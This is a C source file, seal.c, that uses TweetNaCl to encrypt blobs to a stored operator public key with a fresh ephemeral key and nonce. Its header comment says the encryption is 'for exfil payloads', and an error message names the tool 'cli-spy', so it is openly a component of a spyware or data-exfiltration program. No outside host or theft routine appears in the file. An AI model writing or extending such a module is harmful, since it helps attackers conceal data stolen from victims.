// seal.c NaCl sealed-box encryption for exfil payloads.
//ephemeral_pk[32] | nonce[24] | mac[16]+ct
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/random.h>
#include "seal.h"
#include "tweetnacl.h"

static unsigned char g_opk[32];
static int g_have_opk;

// TweetNaCl calls this extern; we supply getrandom() + urandom fallback
void randombytes(unsigned char *b, unsigned long long n)
{
    size_t off = 0;
    while (off < n) {
        ssize_t r = getrandom(b + off, n - off, 0);
        if (r > 0) { off += (size_t)r; continue; }
        if (r < 0 && errno == EINTR) continue;
        break;
    }
    if (off == n) return;
    int fd = open("/dev/urandom", O_RDONLY | O_CLOEXEC);
    if (fd < 0) { fprintf(stderr, "cli-spy: no entropy source\n"); exit(1); }
    while (off < n) {
        ssize_t r = read(fd, b + off, n - off);
        if (r > 0) off += (size_t)r;
        else if (r < 0 && errno != EINTR) exit(1);
    }
    close(fd);
}

static int parse_hex(const char *hex)
{
    for (int i = 0; i < 32; i++) {
        unsigned v;
        if (sscanf(hex + 2 * i, "%2x", &v) != 1) return -1;
        g_opk[i] = (unsigned char)v;
    }
    g_have_opk = 1;
    return 0;
}

int seal_init(const char *path)
{
    char hex[65] = {0};
    FILE *f = fopen(path, "r");
    if (!f || !fgets(hex, sizeof hex, f)) { if (f) fclose(f); return -1; }
    fclose(f);
    return parse_hex(hex);
}

int seal_init_hex(const char *hex)
{
    return (hex && strlen(hex) >= 64) ? parse_hex(hex) : -1;
}

int seal_available(void) { return g_have_opk; }

int seal_blob(const unsigned char *msg, size_t mlen,
              unsigned char **out, size_t *outlen)
{
    unsigned char epk[32], esk[32], nonce[24];
    randombytes(nonce, sizeof nonce);
    crypto_box_keypair(epk, esk);

    /* NaCl padded API: 32 leading zero bytes on the message,
     * 16 leading zero bytes come back on the ciphertext. */
    size_t plen = 32 + mlen;
    unsigned char *m = calloc(1, plen), *c = calloc(1, plen);
    if (!m || !c) { free(m); free(c); return -1; }
    memcpy(m + 32, msg, mlen);
    crypto_box(c, m, plen, nonce, g_opk, esk);

    *outlen = 32 + 24 + (plen - 16);
    *out = malloc(*outlen);
    if (*out) {
        memcpy(*out, epk, 32);
        memcpy(*out + 32, nonce, 24);
        memcpy(*out + 56, c + 16, plen - 16);
    }
    memset(esk, 0, sizeof esk);
    memset(m, 0, plen);
    free(m); free(c);
    return *out ? 0 : -1;
}
